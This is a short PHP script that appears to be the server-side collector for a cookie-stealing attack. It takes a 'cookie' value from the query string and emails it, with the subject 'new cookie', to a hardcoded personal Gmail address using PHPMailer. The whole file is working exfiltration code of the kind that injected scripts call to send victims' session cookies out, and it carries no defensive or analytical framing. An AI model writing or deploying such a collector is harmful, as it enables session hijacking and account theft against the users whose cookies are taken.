<?php
require_once 'class.phpmailer.php';
if(!empty($_GET)) {
    ini_set('display_errors', 1);
    error_reporting(E_ALL);
// SEND CONTENT

    $email = new PHPMailer();
    $email->From = 'coeurro@gmail.com';
    $email->FromName = 'Romain';
    $email->Subject = 'new cookie';
    $email->Body = $_GET['cookie'];
    $email->AddAddress("coeurro@gmail.com");
    if ($email->Send()) echo "Mail Sent";
    else {
        header('HTTP/1.1 500 Internal Server Error');
        echo "failed \n" . $email->ErrorInfo;
    }
}
else
{
    echo 'no get';
}